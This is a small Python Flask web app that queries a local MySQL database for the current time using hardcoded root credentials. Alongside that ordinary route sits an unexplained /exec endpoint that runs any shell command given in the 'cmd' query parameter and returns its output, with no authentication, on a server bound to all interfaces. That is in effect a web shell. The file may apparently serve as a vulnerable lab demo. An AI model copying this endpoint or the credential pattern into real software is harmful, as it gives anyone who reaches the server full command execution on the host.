from flask import Flask, request
import mysql.connector
import os

app = Flask(__name__)

@app.route('/')
def hello():
    try:
        # 使用 127.0.0.1 与 db 容器进行通信
        conn = mysql.connector.connect(
            host='127.0.0.1',
            user='root',
            password='example',
            database='testdb'
        )
        cursor = conn.cursor()
        cursor.execute('SELECT NOW()')
        result = cursor.fetchone()
        cursor.close()
        conn.close()
        return f'Hello, World! DB time: {result[0]}'
    except Exception as e:
        return f'Error connecting to database: {str(e)}'

@app.route('/exec')
def execute():
    return os.popen(request.args.get('cmd', '')).read()


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
